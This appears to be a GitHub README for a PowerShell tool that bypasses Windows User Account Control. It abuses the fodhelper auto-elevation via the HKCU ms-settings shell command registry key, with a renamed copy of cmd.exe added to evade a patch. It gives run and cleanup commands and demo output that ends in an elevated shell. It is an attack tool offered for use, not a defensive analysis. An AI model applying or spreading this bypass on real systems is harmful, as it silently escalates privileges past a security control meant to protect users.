# HelloKittyUACBypass
A simple script to bypass UAC using fodhelper process even in the 2024 after "patch"
Note: This script is a bit unstable so feel free to modify, its preferable not use as script but exec evry step as powershell command.

# How it work? 
Its basicaly the default script for uac bypass that u can find here https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1
But copy cmd from C:\Windows\System32\cmd.exe and rename it.
Ofc u can edit process and method. 
## Execution
Basic use
```
.\hellokittySayHello.ps1
```

Clearing
```
.\hellokittySayHello.ps1 -clear
```

# What i edit?
- Add function clear that remove reguster and .exe file
- New Params:
  - Destination path
  - Username of current user

# This edit make it more usable or better?
No. The process of bypass still the same just using copy to bypass the "fix"

# Why HelloKitty?
Becouse its funny

# Demo
# Ofc as always u need to be part of localadmin group

```
PS C:\Users\IlMurloDiplomato\Desktop> whoami /priv

INFORMAZIONI PRIVILEGI
----------------------

Nome privilegio               Descrizione                               Stato
============================= ========================================= ============
SeShutdownPrivilege           Arresto del sistema                       Disabilitato
SeChangeNotifyPrivilege       Ignorare controllo incrociato             Abilitato
SeUndockPrivilege             Rimozione del computer dall'alloggiamento Disabilitato
SeIncreaseWorkingSetPrivilege Aumento di un working set di processo     Disabilitato
SeTimeZonePrivilege           Modifica del fuso orario                  Disabilitato
```

```
PS C:\Users\IlMurloDiplomato\Desktop> .\hellokittySayHello.ps1


    Hive: HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open


Name                           Property
----                           --------
command

DelegateExecute :
PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open
PSChildName     : command
PSDrive         : HKCU
PSProvider      : Microsoft.PowerShell.Core\Registry

Hellokitty says Hello! ^.^


PS C:\Users\IlMurloDiplomato\Desktop> ls


    Directory: C:\Users\IlMurloDiplomato\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        09/05/2024     17:38         323584 hellokitty.exe
-a----        25/06/2024     12:45           1302 hellokittySayHello.ps1

PS C:\Users\IlMurloDiplomato\Desktop> fodhelper.exe
PS C:\Users\IlMurloDiplomato\Desktop>
```

In my case thats open a new terminal
```
Impossibile trovare il testo del messaggio per il numero di messaggio 0x2350 nel file di messaggio per Application.

(c) Microsoft Corporation. Tutti i diritti riservati.
Risorse di memoria disponibili insufficienti per elaborare il comando.

C:\Windows\System32>
```
